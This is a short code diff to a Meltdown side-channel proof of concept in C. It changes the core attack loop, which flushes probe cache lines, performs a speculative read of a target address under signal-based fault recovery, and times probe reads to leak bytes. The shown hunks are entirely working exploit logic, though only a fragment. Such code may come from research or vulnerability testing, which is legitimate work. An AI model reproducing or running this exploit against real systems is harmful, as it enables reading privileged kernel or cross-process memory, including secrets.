@@ -50,7 +50,6 @@
  * Assembler functions
  */
 void clflush(const void *addr);
-void rflush(const void *addr, size_t n, size_t step);
 uint64_t rdtsc64(void);
 uint32_t rdtsc32(void);
 uint64_t timed_read(const void *);
@@ -248,9 +247,11 @@ meltdown(void)
 	for (i = 0; i < atk_len; ++i) {
 		memset(deltas, 0, sizeof deltas);
 		for (r = 0; r < atk_rounds; ++r) {
-			rflush(probe, PROBE_NLINES, PROBE_LINELEN);
-			if ((signo = sigsetjmp(jmpenv, 1)) == 0)
+			if ((signo = sigsetjmp(jmpenv, 1)) == 0) {
+				for (v = 0; v < PROBE_NLINES; ++v)
+					clflush(&probe[v * PROBE_LINELEN]);
 				spec_read(&atk_addr[i], probe, PROBE_SHIFT);
+			}
 			for (v = 0; v < PROBE_NLINES; ++v)
 				deltas[v] += timed_read(&probe[v * PROBE_LINELEN]);
 		}
